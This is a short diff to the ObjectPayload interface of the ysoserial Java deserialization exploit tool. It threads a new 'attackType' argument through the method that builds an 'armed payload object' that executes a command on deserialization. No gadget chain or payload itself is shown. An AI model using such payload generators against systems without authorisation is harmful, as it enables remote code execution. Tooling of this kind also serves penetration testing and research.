@@ -12,12 +12,12 @@ import ysoserial.GeneratePayload;
 
 @SuppressWarnings ( "rawtypes" )
 public interface ObjectPayload <T> {
-
+	
     /*
      * return armed payload object to be serialized that will execute specified
      * command on deserialization
      */
-    public T getObject ( String command ) throws Exception;
+    public T getObject ( String command, String attackType ) throws Exception;
 
     public static class Utils {
 
@@ -56,7 +56,7 @@ public interface ObjectPayload <T> {
         }
 
 
-        public static Object makePayloadObject ( String payloadType, String payloadArg ) {
+        public static Object makePayloadObject ( String payloadType, String payloadArg, String attackType ) {
             final Class<? extends ObjectPayload> payloadClass = getPayloadClass(payloadType);
             if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
                 throw new IllegalArgumentException("Invalid payload type '" + payloadType + "'");
@@ -66,7 +66,7 @@ public interface ObjectPayload <T> {
             final Object payloadObject;
             try {
                 final ObjectPayload payload = payloadClass.newInstance();
-                payloadObject = payload.getObject(payloadArg);
+                payloadObject = payload.getObject(payloadArg, attackType);
             }
             catch ( Exception e ) {
                 throw new IllegalArgumentException("Failed to construct payload", e);
